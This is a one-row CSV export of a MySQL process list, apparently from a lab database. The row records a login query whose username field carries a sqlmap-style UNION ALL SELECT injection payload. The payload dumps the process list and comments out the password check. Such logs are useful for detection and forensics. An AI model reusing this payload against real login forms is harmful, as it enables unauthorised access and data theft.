ID,DB,INFO,STATE,HOST,TIME,USER,COMMAND
48755,techcorp_db,"SELECT * FROM users WHERE username = 'qIDf' UNION ALL SELECT 36,CONCAT(0x717a717671,JSON_ARRAYAGG(CONCAT_WS(0x7764776b6c6d,IFNULL(CAST(COMMAND AS CHAR),0x20),IFNULL(CAST(DB AS CHAR),0x20),IFNULL(CAST(ID AS CHAR),0x20),IFNULL(CAST(INFO AS CHAR),0x20),IFNULL(CAST(STATE AS CHAR),0x20),IFNULL(CAST(`HOST` AS CHAR),0x20),IFNULL(CAST(`TIME` AS CHAR),0x20),IFNULL(CAST(`USER` AS CHAR),0x20))),0x7178707171),36,36,36 FROM information_schema.`PROCESSLIST`-- -' AND password = 'PbLg'",executing,172.20.0.10:51740,0,techcorp_user,Query

